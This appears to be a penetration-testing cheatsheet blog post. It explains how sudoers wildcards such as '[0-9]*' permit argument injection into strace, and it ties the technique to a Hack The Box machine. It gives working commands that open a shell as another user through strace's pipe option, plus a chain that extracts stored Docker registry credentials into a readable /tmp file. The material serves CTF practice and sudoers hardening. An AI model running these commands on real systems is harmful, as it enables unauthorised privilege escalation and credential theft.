---
title: "Sudoers Wildcard Bypass with Strace"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Sudoers Wildcard Bypass with Strace"
summary: "PrivEsc | Sudoers Wildcard Bypass with Strace"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false

cover:
  image: "/images/covers/cheatsheet.svg"
  alt: "cheatsheet"
  relative: false
---

## Context
In sudoers files, wildcard characters behave differently than in shell globbing. The `*` character matches **everything**, including spaces and additional arguments. This allows argument injection.

## Dangerous Patterns

### `[0-9]*` (matches digit + anything)
```
user ALL=(target) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```
Intended: only allow attaching to a PID (numeric).
Reality: `[0-9]*` matches `1 -o |/bin/bash` because `*` matches spaces and all subsequent characters.

### Plain `*`
```
user ALL=(target) NOPASSWD: /usr/bin/somecommand *
```
Matches any arguments, including those with spaces and special characters.

## Exploitation with strace

### strace -o '|command' (pipe output to command)
When strace is allowed with a wildcard on the PID:
```bash
# Direct shell
sudo -u target /usr/bin/strace -s 128 -p 1 -o '|/bin/bash'

# Execute specific command
sudo -u target /usr/bin/strace -s 128 -p 1 -o '|/bin/bash -c "id > /tmp/pwned"'
```

The `-o '|command'` feature pipes strace output through a shell command. The `|` prefix tells strace to treat the argument as a command, not a filename.

### Combined with docker login (credential extraction)
If sudoers also allows `docker login`:
```bash
# Terminal 1: start docker login (will prompt for credentials from stored helper)
sudo -u target /usr/bin/docker login &
DPID=$!

# Terminal 2: strace it with argument injection to extract credentials
sudo -u target /usr/bin/strace -s 128 -p $DPID -o '|/bin/bash -c "echo https://index.docker.io/v1/ | docker-credential-docker-auth get > /tmp/creds && chmod 644 /tmp/creds"'
```

The docker-credential-helper returns JSON: `{"ServerURL":"...","Username":"...","Secret":"..."}`.

## Key Notes
- In sudoers, `*` matches **spaces** (unlike shell globbing)
- `[0-9]*` = one digit followed by anything = effectively unrestricted
- Always check exact sudoers rules: `sudo -l`
- strace `-o '|cmd'` is a well-known command execution technique
- Other tools with similar pipe/exec features: `awk`, `find -exec`, `vim -c`, `tar --checkpoint-action`

## References
- https://www.sudo.ws/docs/man/sudoers.5/#Wildcards
- GTFOBins strace: https://gtfobins.github.io/gtfobins/strace/

## Seen In
- HTB Sorcery (Insane): tom_summers_admin → rebecca_smith via strace wildcard bypass + docker-credential-helper extraction
